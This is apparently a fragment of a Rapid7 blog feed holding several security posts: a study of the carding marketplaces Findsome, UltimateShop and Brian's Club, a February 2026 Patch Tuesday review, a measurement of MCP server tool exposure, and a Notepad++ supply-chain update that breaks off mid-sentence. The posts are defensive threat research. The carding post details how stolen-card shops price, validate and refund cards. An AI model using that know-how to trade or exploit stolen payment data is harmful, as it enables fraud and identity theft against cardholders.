    "summary": "<p><em>Rapid7 software engineer Eliran Alon also contributed to this post.</em></p>Introduction<p>Despite sustained efforts by the global banking and payments industry, credit card fraud continues to affect consumers and organizations on a large scale. Underground “dump shops” play a central role in this activity, selling stolen credit and debit card data to criminals who use it to conduct unauthorized transactions and broader fraud campaigns. Rather than fading under increased scrutiny, this illicit trade has evolved into a structured, service-like economy that mirrors legitimate online marketplaces in both scale and sophistication.</p><p>This evolution has given rise to what can be described as carding-as-a-service (CaaS): a resilient underground market that wraps together stolen payment card data, tools, and support into easily accessible offerings. These stolen credit cards are also often bundled with sensitive personal information, substantially elevating the potential damage to both individuals and organizations, and making the financial loss the least harmful consequence.     </p><p>While numerous dump shops have been disrupted or shut down over time, several high-profile marketplaces, including Findsome, UltimateShop, and Brian’s Club, continue to shape the market and influence criminal activity. This blog explores these illegal marketplaces and their operations, shedding light on the modern carding economy and highlighting why stronger detection and prevention efforts remain critical.</p>The carding economy at a glance<p>Credit card information available on the black market is generally categorized into three types: credit card numbers, dumps, and 'fullz'.</p><ul><li><p><strong>Credit card numbers (also known as \"CVV\") </strong>minimally include the data printed on the card: the credit card number itself, cardholder name, expiration date, and the CCV2 security code (found on the back, not to be confused with CVV). This group may also include the associated billing address and phone number.</p></li><li><p><strong>Dumps</strong> consist of the raw data from the magnetic stripe tracks. This information is essential for cloning physical credit cards.</p></li><li><p><strong>Fullz</strong> offers a more complete profile of the cardholder, containing additional personal information such as the date of birth or Social Security Number (SSN).</p></li></ul><p>The exact origin of the information available on the different marketplaces is unclear and is being obfuscated by the admins and resellers; however, further investigation across different cybercrime forums revealed the common methods through which cards get leaked.</p>Phishing<strong> </strong><p>Technological improvements have made phishing campaigns much easier to execute. Today, there are phishing-as-a-service (PhaaS) platforms and fraud-as-a-service (FaaS) modules allowing easy setup for new phishing campaigns, along with the infrastructure, page design, and even the collection of credentials or other stolen information (Figure 1). Phishing pages, tricking customers into providing personal financial information (PFI), are still an efficient source for stolen credit information.</p><p>⠀</p>Figure 1 - Creation of a phishing page using a phishing-as-a-service providerPhysical Devices<p>Physical hacking tools, and other devices that could be attached to different payment devices or ATMs, are used to transmit information into the hands of a malicious actor. Different specialized stores offer to sell such devices and ship them, once again allowing even a novice to start stealing credit information for future use. Threat actors attempt to stay as up-to-date as possible, adjusting themselves to industry trends. These include “Shimming,” which focuses on modern EMV chips, instead of old “Skimming” devices, which require scanning the entire card (Figure 2). The hacking tools target not only ATMs, but also additional devices with daily credit card use, including gas pumps and point-of-sale (POS) machines.</p><p>⠀</p>Figure 2 - A store specializing in selling skimmers and other physical attachmentsMalware<p>Since the large-scale Target breach in 2013, which resulted in the compromise of millions of credit card records, threat actors have steadily evolved point-of-sale (POS) malware variants such as BlackPOS and MajikPOS (Figure 3). In parallel, the widespread adoption of information-stealing malware (“infostealers”) has enabled attackers to harvest credit card data from a broad range of systems, typically alongside additional personally identifiable information (PII) and user credentials.</p><p>⠀</p>Figure 3 - Threat actor offering POS malware (MajikPOS) in SaaS moduleCross-Site Scripting (XSS)<p>Many posts found on different cybercrime forums provide carders with tips about how to exploit web security flaws. In some cases, there are actual examples and guides, including code samples for conducting XSS, i.e., redirecting network traffic into the threat actor’s hands through an injected code (usually JavaScript). Malicious actors inject the “sniffer” in the payment page itself, which later copies the inserted payment information and transfers it to them for future use (Figure 4).</p><p>⠀</p>Figure 4 - A threat actor offering instructions for coding sniffersKey players in the carding underground<p>Through ongoing changes within the carding ecosystem and the developments made in fraud detection and prevention, the industry of stolen credit card trading continues to flourish. Banks and credit card companies might be fairly good at monitoring individual transactions, but not at disrupting the broader fraud supply chain. CaaS exploits gaps between payment security, identity security, and organizational visibility, monetizing stolen data upstream before fraud ever reaches issuer models. In addition, fraudsters feed on the ever-lasting weakness of the human factor, acting carelessly with personal information and ignoring security warnings.  </p><p>These factors, in conjunction with constant market demand, have kept several carding marketplaces, led by Findsome, UltimateShop, and Brian’s Club, in action for a lengthy period. While the design and branding of these marketplaces differ, their core offerings and functionality are largely similar. As a result, their administrators frequently promote their services across dedicated carding marketplaces and broader cybercrime communities.</p><p>The main interface of these marketplaces features a streamlined search function that allows users to filter available listings using several parameters, including Bank Identification Number (BIN), country, and “base” - a collection of card records linked to the same issuing bank, card brand (e.g., Visa or Mastercard), and card type, typically compromised within a similar time frame. Filtering options vary slightly between platforms and may include additional criteria such as price range or the availability of supplemental PII, including SSNs.</p><p>Search results generally display the card’s expiration date, issuing bank, cardholder name, and approximate geographic location. Each listing also indicates its price and whether it is eligible for a refund. Refund functionality is a critical feature in the carding ecosystem, as it enables buyers to recover funds for cards that later prove invalid. This capability often serves as a differentiating factor between marketplaces, as user complaints on carding marketplaces frequently center on invalid cards, denied refunds, or the resale of outdated card data.</p><p>These carding marketplaces do not disclose the sources of their stolen credit card data and appear to rely primarily on third-party vendors offering previously compromised records. This suggests that they operate as aggregators, reselling data obtained from multiple external suppliers after conducting their own quality assessments. While this model enables platforms to increase both the volume and diversity of their listings, it can also lead to inconsistencies in data quality. Additionally, some resellers appear to offer identical datasets across multiple marketplaces to maximize profits, resulting in overlapping bases between platforms (Figure 5).</p><p>⠀</p>Figure 5 - Forum discussion about an UltimateShop reseller<p>⠀</p><p>All three marketplaces support Bitcoin payments, while Findsome is currently the only platform that accepts additional cryptocurrencies, including Litecoin and Zcash. Minimum deposit requirements are generally low, ranging from $0 on UltimateShop to $20 on Brian’s Club, likely to reduce barriers to entry and attract new users. In parallel, Findsome and UltimateShop offer deposit bonuses, typically between 5% and 12%, to incentivize larger payments and encourage long-term user engagement.</p><p>These marketplaces are hosted on the dark web, with mirrored versions accessible via the surface web. To mitigate the risk of takedowns or law enforcement action, administrators frequently rotate their surface-web domains. This practice has likely contributed to the proliferation of fraudulent domains impersonating legitimate marketplaces, such as findsome[.]ink and findsomes[.]ru for Findsome, and ultimateshops[.]to for UltimateShop. These sites are designed to leverage brand recognition to deceive users and steal funds. In response, the marketplaces publish lists of their official domains and warn users about potential scams in an effort to maintain trust and protect their reputations.</p>Findsome<p>Findsome is a deep and dark web carding marketplace that has reportedly been active since 2019. The platform, whose administrators are likely of Russian origin, appears to specialize in the sale of stolen CVV, as well as Fullz. Listings are typically priced between $4 and $25 per record, depending on the perceived “quality” of the data.</p><p>Under its “Shop” tab, Findsome enables users to browse and filter available credit card listings of interest (Figure 6). Each listing specifies whether a refund is available should the card prove to be invalid, along with a defined “check time.” The check time refers to a limited window following purchase during which the buyer may attempt to verify the card’s validity and request a refund if necessary.</p><p>⠀</p>Figure 6 - The “Shop” tab on Findsome<p>⠀</p><p>During the designated check-time window, users may attempt to validate the purchased record. The marketplace claims to integrate third-party checker services, such as Luxchecker, which it describes as commonly used across comparable platforms. If the validation process indicates that the card is not valid, a refund is reportedly issued (Figure 7).</p><p>⠀</p>Figure 7 - Card validation outcome<p>⠀</p><p>Actors associated with the marketplace have been observed seeking “resellers” offering large bases on cybercrime forums (Figure 8). Although Findsome does not explicitly disclose information about its resellers, their aliases appear to be embedded in the naming conventions of the databases. For instance, a database titled “NOV 23 _#(KOJO***) GOOD US JP SE” suggests that it was supplied by a reseller operating under the alias “KOJO***.”</p><p>⠀</p>Figure 8 - Findsome’s post on cardforum.cc<p>⠀</p><p>An analysis of the databases published during the second half of 2025 identified the five most frequent resellers in that period (Table 1). These resellers largely dominated Findsome’s inventory, collectively accounting for more than 50% of its offerings. Overall, 51 resellers were active on the platform during this timeframe, with an average market share of approximately 2% per reseller. This distribution suggests that Findsome relies on a broad network of resellers, likely to diversify its listings and reduce dependence on a small number of dominant suppliers.</p><p>⠀</p><p><strong>Reseller</strong></p><p><strong>Records</strong></p><p><strong>Share</strong></p><p>tian*****</p><p>303,818</p><p>13%</p><p>vygg*******</p><p>266,382</p><p>11%</p><p>mapk**</p><p>231,797</p><p>10%</p><p>atla****</p><p>231,757</p><p>10%</p><p>find*****</p><p>217,846</p><p>9%</p><p><em>Table 1 - Reseller market share</em></p><p>⠀</p><p>Despite its prominence, Findsome appears to face competition from smaller, emerging platforms. While it is sometimes described within cybercrime communities as relatively “reliable,” discussions on underground forums reveal dissatisfaction with its pricing model. Some actors have criticized the marketplace for charging high prices for data that is frequently invalid (Figure 9), while others view the $100 account activation fee for new users as a significant barrier to entry.</p><p>⠀</p>Figure 9 - Mentions of Findsome on another carding marketplaceUltimateShop <p>UltimateShop is a deep and dark web carding marketplace that has been active since at least 2022. Its administrators appear to be of Russian origin and offer mainly CVV and Fullz. The stolen credit cards are priced between $10 and $30 per record, depending on the assessed “quality” of the data.</p><p>Under its “Search CCS” tab, UltimateShop allows users to filter and browse available credit card listings (Figure 10). In addition to standard filters such as BIN and issuing bank, the platform enables users to specify a price range, select individual sellers, and limit results to listings for which validation is available. The results section displays key details about the issuing bank and cardholder, as well as the seller’s name, an assessed validity percentage, and refund eligibility. It should be noted that certain BINs and issuing banks are excluded from validation checks on UltimateShop.</p><p>⠀</p>Figure 10 - The “Search CCS” tab on UltimateShop<p>⠀</p><p>While purchasing a record, users may initiate a validation check where applicable (Figure 11). UltimateShop does not impose a strict timeframe for this process and does not disclose the checker or validation mechanism used. If the card is deemed invalid (e.g., marked as “Decline”), the user is eligible for a refund.</p><p>⠀</p>Figure 11 - Card validation outcome<p>⠀</p><p>UltimateShop’s inventory is largely dominated by a small number of resellers, which collectively accounted for 76% of the platform’s largest offerings during the second half of 2025 (Table 2). SuperUSA appears to be the most prominent seller, contributing approximately 35% of all available records. This concentration indicates a higher reliance on a limited set of resellers and comparatively lower diversification than competing marketplaces such as Findsome. In total, 22 primary resellers were identified on UltimateShop, with an average market share of approximately 5% per reseller.</p><p>⠀</p><p><strong>Reseller</strong></p><p><strong>Records</strong></p><p><strong>Share</strong></p><p>superusa</p><p>293,931</p><p>35%</p><p>best</p><p>116,464</p><p>14%</p><p>virgin</p><p>82,672</p><p>10%</p><p>sanji</p><p>79,110</p><p>9%</p><p>freshsniffer</p><p>62,760</p><p>8%</p><p><em>Table 2 - Reseller market share on UltimateShop</em></p><p>⠀</p><p>While UltimateShop remains a well-established platform within the carding ecosystem, its reputation is increasingly being challenged by negative user feedback. Complaints frequently cite high prices and a significant proportion of invalid records, issues that may stem from the platform’s reliance on a small number of potentially unreliable sellers (Figure 12).</p><p>⠀</p>Figure 12 - Discussion about UltimateShop on another carding marketplaceBrian’s Club<p>Active since 2014, Brian’s Club is a well-established player within the carding ecosystem that was originally created to “troll” security researcher and reporter Brian Krebs and his work. Like other marketplaces, it offers a wide range of listings, categorized as “CVV2,” “Dumps,” and “Fullz” (Figure 13). Prices typically range from $17 to $49, though higher prices are often observed for records that include PINs, an uncommon feature among carding marketplaces.</p><p>⠀</p>Figure 13 - The “Search Dumps” tab on Brian’s Club<p>⠀</p><p>Another key point of differentiation for Brian’s Club is its extensive offering of dumps, suggesting explicit support for credit card cloning. This is further reinforced by the availability of a “Track1 Generator” tool, which facilitates the creation of physical copies of compromised cards (Figure 14). Together, these features represent a relatively unique value proposition within the carding market and indicate that Brian’s Club administrators have deliberately positioned the platform to address specific customer needs and prevailing market dynamics.</p>General statistics<p><em><strong>Note:</strong></em><em> The data in this section, specifically the numerical figures, comes directly from the marketplaces and, therefore, its precision cannot be independently verified or guaranteed.</em></p><p>Out of the examined marketplaces, Findsome has the largest market size with 57.6%, followed by UltimateShop (26.6%) and Brian’s Club (15.8%) (Figure 14). </p><p>⠀</p>Figure 14 - The market size of the examined marketplaces<p>⠀</p><p>The vast majority of leaked credit cards are Visa cards (60.4%), followed by Mastercard (32.3%), American Express (4.3%), and Discover (3%), with this distribution remaining consistent across the three examined marketplaces (Figure 15). These numbers, however, do not reflect the actual market size of each brand, as according to the 2025 Nilson Report, Visa and Mastercard control relatively similar market sizes, with 32% and 24%, respectively, and American Express and Discover are far behind with 6% and 0.9%. In addition, the most popular credit card brand, Union Pay, with 36% of the market, is not even among the top 4 most leaked brands, probably due to its relatively unique target audience (China), which is not typically targeted by carders in these marketplaces.</p><p>However, the leaked credit cards' brand distribution more closely resembles their market share in the United States (Visa - 52%, Mastercard - 24%, American Express - 19%, Discover - 5%), which is where most of the victims originate.</p><p>⠀</p>Figure 15 - Leaked credit card brand distribution by marketplace<p>⠀</p><p>Most of the leaked credit cards we observed in H2 2025 belong to US customers, followed by ones from Canada (by a large margin) and the United Kingdom (Figure 16). </p><p>⠀</p>Figure 16 - Global credit card leakage heatmap<p>⠀</p><p>When comparing the top 10 countries list of each of the examined marketplaces (Figures 17, 18, and 19), we can see that UltimateShop’s list is somewhat unusual, with rarely targeted countries, like Peru and Norway, making the Top 10 list while surpassing very populated and highly targeted countries, such as the United Kingdom and France. In this sense, it should be noted that the geographic data sourced from UltimateShop contained numerous inconsistencies. Thus, it may not be a reliable indicator of the actual distribution of victims.</p><p>⠀</p>Figure 17 - Top 10 countries with leaked credit cards on Findsome<p>⠀</p>Figure 18 - Top 10 countries with leaked credit cards on UltimateShop<p>⠀</p>Figure 19 - Top 10 countries with leaked credit cards on Brian’s Club<p>⠀</p><p>When examining the monthly distribution of leaked credit cards (Figure 20), we observe that the largest volume was recorded in November and December, likely due to the shopping season (e.g., Black Friday and Cyber Monday) that occurs around that time.</p><p>⠀</p>Figure 20 - Count of leaked credit cards by country per month<p>⠀</p><p>When examining the types of personal information being exposed along with the leaked credit card, we saw that most of the credit cards are also attached with an email address or a phone number (or both), with the highest percentages recorded in UltimateShop (99.4% of the cases), followed by Findsome (87.7%), and Brian’s Club (75.7%). This means that the leakage of a credit card not only poses a risk for financial scams resulting in monetary losses, but also exposes PII, which may lead to identity theft and impersonation attempts.</p>The future of carding<p>The carding ecosystem is gradually moving away from large-scale magnetic stripe (“dump”) fraud as EMV adoption makes card cloning harder and less reliable. While shimming and the capture of PINs allow criminals to continue card-present fraud, this approach is riskier, more expensive, and usually limited to specific regions or devices. As a result, EMV-based fraud is unlikely to fully replace the dump economy at scale. Instead, it is expected to support smaller, localized operations rather than the global, highly automated carding marketplaces that dominated in the past.</p><p>At the same time, carding marketplaces are increasingly focused on selling richer data sets that include personal and contact information (“Fullz”), not just card details. This shift enables a wider range of fraud, including account takeover, wallet abuse, phishing, and identity-based scams, which are less dependent on the underlying payment technology. Rather than disappearing, carding-as-a-service is evolving into a broader identity-driven ecosystem, where marketplaces supply raw data, and buyers use automation and AI to decide how and where to exploit it.</p>What organizations should do<p>The continued growth of carding marketplaces highlights how credit card theft has evolved into a resilient, service-based criminal economy that is difficult to disrupt through takedowns alone. In addition, as stolen cards are increasingly bundled with credentials and personal data, the potential damage inflicted by the CaaS economy has ceased to be purely financial. The impact extends beyond isolated fraud events to long-term identity abuse and account compromise affecting both organizations and consumers.</p><p>To cope with the growing threat of stolen credit cards and leaked credentials, organizations should adopt a defense-in-depth approach that combines prevention, detection, and rapid response. This includes strengthening protections against common compromise vectors such as phishing, malware, and web application vulnerabilities by enforcing multi-factor authentication, regularly patching systems, hardening payment pages against client-side attacks, and conducting ongoing security awareness training. At the same time, organizations should invest in continuous monitoring capabilities to detect early signs of exposure, including visibility into dark web and underground marketplaces where stolen card data and credentials are traded. </p><p>By proactively identifying leaked assets, correlating them to their own environments (for example, through BIN monitoring), and responding quickly through card reissuance, credential resets, and fraud monitoring, organizations can significantly reduce both financial losses and downstream risks such as identity theft and account takeover.</p>Rapid7 customers<p>There are multiple detections in place for Threat Command and MDRP customers to identify and alert on the threat actor behaviors described in this blog. Specifically, Threat Command monitors dark web activity, including exposed credit card details that are being sold on carding marketplaces. Relevant incidents are flagged based on the customer’s assets, specifically their BIN. When a listing containing these assets is identified, a “Credit Cards For Sale” alert is issued (Figure 21). In addition to notifying customers, these alerts enable them to quickly and securely acquire the detected bot through the “Ask an Analyst” service.</p><p>⠀</p>Figure 21 - Example of an alert about a credit card offered for sale on a carding marketplace<p></p>",

    "summary": "<p>Microsoft is publishing 55 vulnerabilities this <a href=\"https://msrc.microsoft.com/update-guide/releaseNote/2026-Feb\">February 2026 Patch Tuesday</a>. Microsoft is aware of exploitation in the wild for six of today’s vulnerabilities, and notes public disclosure for three of those. Earlier in the month, Microsoft provided patches to address three browser vulnerabilities, which are not included in the Patch Tuesday count above.</p>Windows/Office triple trouble: zero-day security feature bypass vulns<p>All three of the publicly disclosed zero-day vulnerabilities published today are security feature bypasses, and Microsoft acknowledges the same cast of reporters in each case.</p><p><a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21510\">CVE-2026-21510</a> describes a zero-day Windows Shell security feature bypass vulnerability which is already exploited in the wild. Not to be confused with PowerShell, most people will use the Windows Shell without ever learning its name or even really contemplating its existence. The Windows Shell is Microsoft’s term for the GUI interaction logic for the entire OS provided by explorer.exe and associated libraries and APIs.</p><p>CVE-2026-21510 provides an attacker with a way to dodge those pesky Smart Screen or other “are you sure?” prompts. The advisory sets out that “an attacker must convince a user to open a malicious link or shortcut file”. We could parse this wording more than one way, and while shortcut files with a .lnk extension are certainly a prime suspect here, it’s possible that .url files might also be a vector.</p><p>The venerable MSHTML/Trident web rendering engine is still present in Windows as a daily driver for Office and Explorer, many years after most people stopped using Internet Explorer.  Accordingly, every so often Microsoft has to patch another zero-day vulnerability in the browser it can’t quite bring itself to rip out of its flagship operating system. Today’s example is <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21513\">CVE-2026-21513</a>, a security feature bypass which starts with the attacker convincing a user to open a malicious HTML file or shortcut file.</p><p>If good things come in threes, then perhaps <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21514\">CVE-2026-21514</a> makes security bypass zero-day vulnerabilities a good thing. Exploitation involves bypassing Object Linking &amp; Embedding (OLE) mitigations by convincing the user to open a malicious Word document. The advisory only lists remediations for LTSC versions of Office and on-prem Microsoft 365 Apps for Enterprise, without mentioning the standard Microsoft 365 suite.</p><p>It’s curious that Microsoft has evaluated the attack vector for CVE-2026-21514 as local, because MSRC typically assesses any vulnerability which boils down to “remote attacker tricks user into opening malicious payload” as a remote attack, based on the location of the attacker. However, the advisory specifically calls out that “reliance on untrusted inputs in a security decision in Microsoft Office Word allows an unauthorized attacker to bypass a security feature locally.” It’s not clear whether this is a deviation from prior practice by MSRC, an inadvertent mis-assessment, or an unusual-but-correct assessment of an attack vector that relies on details which Microsoft has not made public. Happily, the Preview Pane is not a vector, which raises the bar slightly for an attacker, since the user must explicitly open the malicious file or web page.</p><p>Ultimately, although none of the advisories for <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21510\">CVE-2026-21510</a>, <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21513\">CVE-2026-21513</a>, or <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21514\">CVE-2026-21514</a> explicitly come out and say it, it’s likely that exploitation in each case involves tricking Windows into participating in another Mark-of the Web laundering scheme using flaws in old components.</p>Windows DWM: zero-day elevation of privilege<p>For the <a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-january-2026/\">second month in a row</a>, the Windows Desktop Windows Manager (DWM) is the site of an exploited-in-the-wild zero-day vulnerability. Last month’s <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-20805\">CVE-2026-20805</a> was an information disclosure vulnerability, effectively a treasure map for threat actors seeking the otherwise obfuscated in-memory address of the kernel-space DWM process. The publication of zero-day elevation of privilege (EoP) vulnerability <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21519\">CVE-2026-21519</a> today very likely reflects MSTIC and MSRC working to thwart the same threat actor in both cases. As Rapid7 has noted in the past, initial access coupled with local elevation of privilege vulnerabilities is the staple diet of many successful attackers, so the lower CVSS v3 base score of 7.8 seen here versus a broadly equivalent remote code execution is not a sign to delay patching.</p>Remote Desktop Services: zero-day elevation of privilege<p>Remote Desktop Services (RDP) are designed to allow a duly authorized remote user to interact with the server, but <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21533\">CVE-2026-21533</a> allows an unauthorized local user to elevate privileges to SYSTEM. Every Windows Server product back as far as Server 2012 receives patches, so this one has been present for a while. It’s possible that today’s patches close off a long-running exploitation story for at least one threat actor.</p>RasMan: zero-day denial of service<p>Exploited in the wild, but perhaps of less concern is <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21525\">CVE-2026-21525</a>, a local denial of service vulnerability in the Windows Remote Access Connection Manager (RasMan). Somewhat unusually for a local vulnerability, the advisory sets out that no privileges are required at all, so even a guest account can exploit this one. You have disabled those guest accounts, right?</p>Microsoft lifecycle update<p>There are no significant Microsoft product lifecycle changes this month.</p>Summary ChartsSummary Tables<p></p>Apps

    "link": "https://www.rapid7.com/blog/post/tr-measuring-ai-security-mcp-exposure",
    "summary": "<p>The conversation around AI security is full of anxiety. Every week, new headlines warn of jailbreaks, prompt injection, agents gone rogue, and the rise of LLM-enabled cybercrime. It’s easy to come away with the impression that AI is fundamentally uncontrollable and dangerous, and therefore something we need to lock down before it gets out of hand.</p><p>But as a security practitioner, I wasn’t convinced. Most of these warnings are based on hypothetical examples or carefully engineered demos. They raise important questions, but rarely answer the most basic one: <em>What does the real attack surface of today’s AI systems actually look like?</em></p><p>So instead of offering another opinion, I ran the numbers.</p>The method: Focused, real-world measurement<p>To ground the conversation in reality, I focused on MCP, the Model Context Protocol. This framework is widely used to help language models interact with tools, APIs, and external systems. It’s open source, replicated across many environments, and built for practical integration. That makes it an ideal test case for understanding actual exposure.</p><p>No adversarial prompting. No artificial exploits. Just a measurement of what real MCP servers expose. We used SDK import analysis to locate active repositories, filtered out those that wouldn’t run, and examined the tool schemas to understand what each was capable of.</p>What the data tells us<p>The MCP servers that met our criteria showed a familiar pattern. They exposed well-understood primitives used throughout modern software systems.</p><p><strong>Observed capability classes:</strong></p><ul><li><p>Filesystem access</p></li><li><p>HTTP requests</p></li><li><p>Database queries</p></li><li><p>Local script or process execution</p></li><li><p>Orchestration and tool chaining</p></li><li><p>Read-only API search</p></li></ul><p>These are not exotic capabilities unique to AI. They’re already embedded in cloud automation, infrastructure-as-code, and modern DevOps stacks. MCP simply gives them structure.</p>The frequency of high-severity risk is low<p>One of the most unexpected findings was the rarity of arbitrary code execution. Despite warnings in the media, this turned out to be the least common capability among all operational MCP servers analyzed.</p><p>This matters. It suggests that real-world deployments of AI tooling are not as reckless as some narratives claim. The most common issues are the ones we’ve known for years: weak defaults, excessive permissions, and poor input handling. There’s no mystery there (and that’s encouraging).</p>Where the real risk builds: Composition<p>The problem arises when those primitives are combined. Individually, most of the MCP servers we studied were low risk. But when orchestration enters the picture, the attack surface expands.</p><p><strong>Some real-world examples we observed:</strong></p><ul><li><p>HTTP fetch + filesystem write = persistence or content injection</p></li><li><p>Database query + orchestration = stealthy exfiltration</p></li><li><p>Filesystem write + planning = poisoned output or config hijacking</p></li><li><p>HTTP + planning + execution = multi-stage agent attacks</p></li></ul><p>These combinations reflect what adversaries already do in non-AI environments. MCP just reduces friction in putting the pieces together.</p>A critical counterpoint: The 'best effort' reality<p>The focus on constraining the model via schema and architecture is essential for '<a href=\"https://www.rapid7.com/blog/post/2024/05/15/ai-trust-risk-and-security-management-why-tackle-them-now/\">secure by design</a>,' yet a critical counterpoint must be considered as the industry evolves: We may not be able to stop many insecure AI applications (e.g., those built on architectures like OpenClaw or Claude Code) from shipping with insecure design choices. Similarly, the insecure design path for AI could force security teams to rely on non-deterministic, 'best effort' prompt injection defenses to prevent data exfiltration and remote code execution, rather than influencing developers toward inherently secure application design.</p><p>While the secure boundary <em>is</em> the schema, and we must influence application developers to adopt secure-by-design principles, the future suggests there will be many cases where this influence fails. This means security leaders must also prepare for a hybrid reality of championing architectural security while also building and operating robust, best effort runtime defenses to manage the fallout from the inevitable wave of insecure AI applications.</p>A shift in where security happens<p>As we embed AI deeper into operational systems, the control points change. Historically, we validated inputs at the UI layer, enforced roles through IAM, and wrapped logic in application code.</p><p>With AI agents, those controls now live in:</p><ul><li><p>The orchestration layer</p></li><li><p>Tool composition workflows</p></li><li><p>Schema contracts</p></li><li><p>Execution sandboxes</p></li></ul><p>Security needs to follow the shift. That means auditing tool chains, setting strict schema policies, isolating execution contexts, and applying existing practices like <a href=\"https://www.rapid7.com/fundamentals/what-is-least-privilege-access-lpa/\">least privilege</a> and defense in depth to this new architecture.</p>What security teams should do now<p>Security and architecture leaders can start applying pressure in the right places today:</p><ul><li><p><strong>Map AI tooling to known primitives</strong><br>Don’t treat these systems as unknowns. Most expose capabilities like file handling, HTTP fetches, or basic shell commands - all of which are familiar territory for teams leveraging<a href=\"https://www.rapid7.com/fundamentals/what-is-threat-intelligence/\"> threat intelligence</a> effectively.</p></li><li><p><strong>Assess schema design before worrying about prompts</strong><br>The schema defines what tools the AI can call and how. Poorly scoped parameters, such as unbounded URLs or file paths, are far more dangerous than clever prompts.</p></li><li><p><strong>Limit orchestration where possible</strong><br>Composability increases risk. If orchestration is required, monitor it like critical automation infrastructure.</p></li><li><p><strong>Audit your environment for capability sprawl</strong><br>Look for AI-connected services that may expose multiple sensitive capabilities together. Risk scales when these tools are combined.</p></li><li><p><strong>Apply existing enterprise controls</strong><br>Network segmentation, credential scoping, logging, and behavioral detections still work. Least privilege access is especially relevant in AI-integrated environments where tool chaining can escalate access unintentionally. AI requires adaptation, not reinvention.</p></li></ul>Understanding the risk of AI without the hype<p>This blog condenses findings from my recent research, where I set out to answer a straightforward question: what are AI systems actually exposing in the real world today? Instead of relying on hypotheticals or fear-driven narratives, I looked at real, runnable Model Context Protocol (MCP) servers and measured their exposed capabilities and architectural design.</p><p>If you're looking for the technical deep dive, including methodology, data sets, and schema-level breakdowns, you can read the original research published on <a href=\"https://hackernoon.com/everyone-says-ai-is-insecure-so-i-measured-it\">HackerNoon</a>. You can also explore more of our ongoing threat analysis and security research on the<a href=\"https://www.rapid7.com/research/\"> Rapid7 Research Hub.</a></p><p>The bottom line: AI introduces complexity and scale, but the fundamental security principles remain the same. The real challenge is whether security teams can adapt traditional controls to new environments and influence developers toward inherently secure application design, rather than being forced to rely on non-deterministic, 'best effort' defenses like prompt injection mitigation.</p>",

    "link": "https://www.rapid7.com/blog/post/tr-chrysalis-notepad-supply-chain-risk-next-steps",
    "summary": "<p>When Rapid7 published its <a href=\"https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/\">analysis of the Chrysalis backdoor</a> linked to a compromise of Notepad++ update infrastructure, it raised understandable questions from customers and security teams. The investigation showed that attackers did not exploit a flaw in the application itself. Instead, they compromised the hosting infrastructure used to deliver updates, allowing a highly targeted group to selectively distribute a previously undocumented backdoor associated with the Lotus Blossom APT.</p><p>Subsequent reporting from outlets including <a href=\"https://www.bleepingcomputer.com/news/security/notepad-plus-plus-update-feature-hijacked-by-chinese-state-hackers-for-months/\">BleepingComputer</a>, <a href=\"https://www.theregister.com/2026/02/02/notepad_plusplus_intrusion/\">The Register</a>, <a href=\"https://www.securityweek.com/notepad-supply-chain-hack-conducted-by-china-via-hosting-provider/\">SecurityWeek</a>, and <a href=\"https://thehackernews.com/2026/02/notepad-official-update-mechanism.html\">The Hacker News</a> has helped clarify the scope of the incident. What’s clear is that this was a supply chain attack against distribution infrastructure, not source code. The attackers maintained access for months, redirected update traffic selectively, and limited delivery of the Chrysalis payload to specific targets, helping them stay hidden and focused on espionage rather than mass compromise.</p>What does the Notepad++ incident mean?<p>This incident highlights how modern supply chain attacks have evolved. Rather than targeting application code, attackers abused shared hosting infrastructure and weaknesses in update verification to quietly deliver malware. The broader takeaway is that supply chain risk now extends well beyond build systems and repositories. Update mechanisms, hosting providers, and distribution paths have become attractive targets, especially when they sit outside an organization’s direct control.</p>Was Notepad++ itself compromised?<p>Based on public statements from the Notepad++ maintainer and independent reporting, there is no evidence that the application’s source code or core development process was compromised. The risk stemmed from the update delivery infrastructure, reinforcing that even trusted software can become a delivery mechanism when upstream systems are abused.</p>Who was behind the Chrysalis backdoor &amp; Notepad++ attack?<p>Rapid7 was the first to publish attribution linking this activity to Lotus Blossom, a Chinese state-aligned advanced persistent threat (APT) group. Based on our analysis, we assess with moderate confidence that this group is responsible for the Notepad++ infrastructure compromise and the deployment of the <a href=\"https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/\">Chrysalis backdoor.</a></p><p>Lotus Blossom has been active since at least 2009 and is known for long-running espionage campaigns targeting government, telecommunications, aviation, critical infrastructure, and media organiations, primarily across Southeast Asia, and more recently, Latin America.</p><p>The tactics, tooling, and infrastructure used in this campaign - including the abuse of update infrastructure, the use of selective targeting, and the deployment of custom malware, are consistent with the group’s historical tradecraft. As with any attribution, this conclusion is based on observed behaviors and intelligence correlations, not a single, definitive indicator.</p>What should organizations do right now?<p>Based on what we know today, there are several immediate actions organizations should take:</p><ul><li><p><strong>Check and update Notepad++ installations.</strong> Ensure any instances are running the latest version, which includes improved certificate and signature verification.</p></li><li><p><strong>Review historical telemetry.</strong> Even though attacker infrastructure has been taken down, organizations should scan logs and environments going back to <strong>October 2025</strong> for <a href=\"https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/\">indicators of compromise</a> associated with this campaign.</p></li><li><p><strong>Hunt, don’t just scan.</strong> This activity was selective and low‑volume. Absence of alerts does not guarantee absence of compromise.</p></li><li><p><strong>Use available intelligence.</strong> Rapid7 Intelligence Hub customers have access to the Chrysalis campaign intelligence, along with follow‑up indicators provided by partners such as Kaspersky, to support targeted hunting across endpoints and network telemetry.</p></li></ul>Why does this matter beyond Notepad++?<p>This incident is a case study in how trust is exploited in modern environments. The attackers didn’t rely on zero days or noisy malware. They abused update workflows, hosting relationships, and assumptions about trusted software. That same approach applies across countless tools and platforms used daily inside enterprise 